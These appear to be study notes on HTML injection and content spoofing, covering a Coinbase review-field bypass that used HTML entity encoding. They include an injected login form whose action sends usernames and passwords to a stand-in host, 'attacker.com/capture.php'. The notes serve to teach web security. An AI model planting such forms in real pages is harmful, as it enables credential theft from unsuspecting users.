# HTML INJECTION AND CONTENT SPOOFING

- It allows malicious user to inject content into a site's web page
- Most commonly they inject in <form> tag
- This attack rely on fooling targets(sometimes called social engineering)
- This both vulnerability are less severe than other vulnerabilities

# HTML Injection
- It occurs when attacker submit HTML tags via some form input or URL parameter
- It is sometimes referred as virtual defacement
- Example
    - Rendering page content that you can control adding form asking user to re-enter username and password
        ```
        <form method="POST" action="http://attacker.com/capture.php" id="login-form">
            <input type="text" name="username">
            <input type="password" name="password">
            <input type="submit" value="Submit">
        </form>
        ```

# Content Spoofing
- It is similar to HTML injection except attackers can only inject plaintext, not HTML tags
- Attacker can't format web page with content spoofing but they can insert text such as message which can fool target into performing an action but rely heavily on socail engineering

**Example**
- **COINBASE COMMENT INJECTION THROUGH CHARACTER ENCODING
    - In HTML we have two characters
        - Reserved characters- angle brackets(<>)
        - Unreserved characters- letters of alphabet
    - Reserved character should be render using their HTML entity name to avoid injection
        - Render (>) as (&gt;)
    - But even unreserved can be render with HTML encoded number
        - Render (a) as (&#97;)
    - Here, enter below into text entry field made for user review
    ```
    <h1> This is test </h1>
    ```
        - Coinbase filder HTML and render as plaintext and submitted text would post as normal review
    - If user submitted text as HTML encoded value
        ```
        &#60;&#104;&#49;&#62; ..........................
        ```
        - Coinbase wouldn't filter tag and decode this string into HTML, which result website rendering <h1> tags